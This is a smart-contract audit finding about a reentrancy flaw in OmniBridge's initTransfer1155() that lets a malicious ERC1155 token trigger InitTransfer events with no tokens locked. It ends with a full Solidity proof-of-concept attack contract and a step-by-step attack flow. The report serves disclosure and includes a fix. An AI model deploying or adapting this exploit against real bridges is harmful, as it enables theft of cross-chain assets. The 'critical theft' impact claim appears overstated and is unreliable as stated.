### Title
Reentrancy via Malicious ERC1155 Token in `initTransfer1155()` Allows Emission of Unbacked `InitTransfer` Events — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155()` makes an external call to an attacker-controlled ERC1155 token contract via `safeTransferFrom` before emitting the `InitTransfer` event. A malicious ERC1155 token can reenter `initTransfer1155()` during that call, causing multiple `InitTransfer` events to be emitted with unique nonces while zero or only one set of tokens is ever actually locked in the bridge. The NEAR side treats every emitted `InitTransfer` event as proof of locked collateral and releases tokens accordingly, enabling the attacker to receive unbacked tokens on NEAR.

---

### Finding Description

`initTransfer1155()` follows this execution order:

1. Increment `currentOriginNonce` (line 448)
2. Call `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), ...)` — **external call to attacker-controlled contract** (line 458–464)
3. Call `initTransferExtension(...)` (line 468–478)
4. Emit `InitTransfer` (line 480–489) [1](#0-0) 

The `onERC1155Received` hook on the bridge checks `operator != address(this)` to reject direct sends: [2](#0-1) 

This check is **bypassable** by a malicious ERC1155 token. When the bridge calls `maliciousToken.safeTransferFrom(user, bridge, ...)`, the bridge is `msg.sender` of that call, so `operator = address(bridge)`. A malicious token's `safeTransferFrom` can call `bridge.onERC1155Received(bridge, user, id, amount, "")` with `operator` set to the bridge address — the check passes. The malicious token can also reenter `initTransfer1155()` from within its `safeTransferFrom` body before calling `onERC1155Received`.

There is **no `nonReentrant` modifier** on `initTransfer1155()`.

The documented security invariant is:

> **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held. [3](#0-2) 

This invariant is broken by the reentrancy.

---

### Impact Explanation

**Critical — Direct theft of bridged assets.**

Each emitted `InitTransfer` event with a unique `originNonce` is treated by the NEAR bridge as proof that the corresponding ERC1155 tokens are locked on EVM. By emitting N events while locking 0 or 1 tokens, the attacker receives N times the token amount on NEAR with no collateral. This is unbacked minting / direct theft of native or bridged assets across chains. [4](#0-3) 

---

### Likelihood Explanation

**High.** The entry point is fully permissionless — any address can call `initTransfer1155()` with any `tokenAddress`. No allowlist, no registration requirement, and no reentrancy guard exists. An attacker only needs to deploy a malicious ERC1155 contract and call the bridge once. [5](#0-4) 

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to both `initTransfer1155()` and `initTransfer()`. Alternatively, move the `emit InitTransfer` and `initTransferExtension` calls to before the `safeTransferFrom` call (checks-effects-interactions), but this would violate the event–transfer atomicity invariant in the opposite direction. The `nonReentrant` guard is the correct fix.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

/// @notice Malicious ERC1155 token that reenters the bridge during safeTransferFrom
contract MaliciousERC1155 {
    IBridge bridge;
    address attacker;
    bool reentered;

    constructor(address _bridge, address _attacker) {
        bridge = IBridge(_bridge);
        attacker = _attacker;
    }

    // ERC1155 balanceOf stub — always returns enough balance
    function balanceOf(address, uint256) external pure returns (uint256) {
        return 1000 ether;
    }

    function isApprovedForAll(address, address) external pure returns (bool) {
        return true;
    }

    /// @dev Called by the bridge in initTransfer1155.
    ///      Reenters the bridge once, then calls onERC1155Received on the bridge
    ///      with operator=bridge to pass the guard.
    function safeTransferFrom(
        address /*from*/,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter: bridge increments nonce to N+1, emits InitTransfer(N+1)
            bridge.initTransfer1155(address(this), id, uint128(amount), 0, 0, "attacker.near", "");
            reentered = false;
        }
        // Call onERC1155Received with operator=bridge (msg.sender here is the bridge)
        // This passes the `operator != address(this)` check
        IERC1155Receiver(to).onERC1155Received(msg.sender, attacker, id, amount, "");
        // Tokens are never actually transferred — internal balance unchanged
    }
}

/// Attack flow:
/// 1. Deploy MaliciousERC1155(bridge, attacker)
/// 2. Call bridge.initTransfer1155(maliciousERC1155, tokenId, amount, 0, 0, "attacker.near", "")
/// 3. Bridge increments nonce to N, calls maliciousERC1155.safeTransferFrom(attacker, bridge, ...)
/// 4. MaliciousERC1155 reenters: bridge increments nonce to N+1, calls safeTransferFrom again
/// 5. Inner safeTransferFrom calls onERC1155Received(bridge, ...) → passes → emits InitTransfer(N+1)
/// 6. Outer safeTransferFrom calls onERC1155Received(bridge, ...) → passes → emits InitTransfer(N)
/// Result: Two InitTransfer events emitted, zero tokens locked.
///         NEAR side releases tokens for both nonces N and N+1.
